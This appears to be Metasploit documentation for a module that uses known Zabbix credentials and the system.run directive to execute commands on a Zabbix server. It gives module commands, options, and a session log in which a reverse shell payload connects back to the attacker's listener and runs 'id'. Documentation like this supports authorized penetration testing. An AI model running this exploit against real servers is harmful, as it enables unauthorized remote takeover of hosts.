## Vulnerable Application

Zabbix server allow remote command execution to happen with the directive `AllowKey=system.run[*]` [[1]](https://blog.zabbix.com/zabbix-remote-commands/7500/#system.run), this directive is disabled by default, if an attacker already know Zabbix credentials and the directive is enabled, he can abuse this functionnality to take control over the Zabbix server.

## Verification Steps

  1. Do: ```use exploit/multi/http/zabbix_script_exec_5_0```
  2. Do: ```set PASSWORD ...```
  3. Do: ```set USERNAME ...```
  4. Do: ```set RHOSTS ...```
  5. Do: ```set payload ...```
  6. Do: ```set LHOST ...```
  7. Do: ```run```

## Options

  PASSWORD          zabbix           yes       Password to authenticate with
  Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS            10.0.0.4         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
  RPORT             80               yes       The target port (TCP)
  SSL               false            no        Negotiate SSL/TLS for outgoing connections
  TARGETURI         /zabbix/         yes       The URI of the Zabbix installation
  TLS_PSK                            no        The TLS PSK
  TLS_PSK_IDENTITY                   no        The TLS identity
  USERNAME          Admin            yes       Username to authenticate with
  VHOST                              no        HTTP server virtual host

## Scenarios

```
RHOSTS => 10.0.0.4
payload => cmd/unix/reverse
LHOST => eth0

[*] Started reverse TCP double handler on 10.0.0.5:4444 
[+] Succesfully connected on Zabbix !
[*] Getting SID...
[*] Getting a valid group id...
[*] Creating a host named: yFylmVzGEyuXoPShpM
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo zHUHPwNyZ6vugM7N;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "zHUHPwNyZ6vugM7N\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 5 opened (10.0.0.5:4444 -> 10.0.0.4:56530 ) at 2022-01-01 23:22:22 +0000

id
uid=111(zabbix) gid=117(zabbix) groups=117(zabbix)
```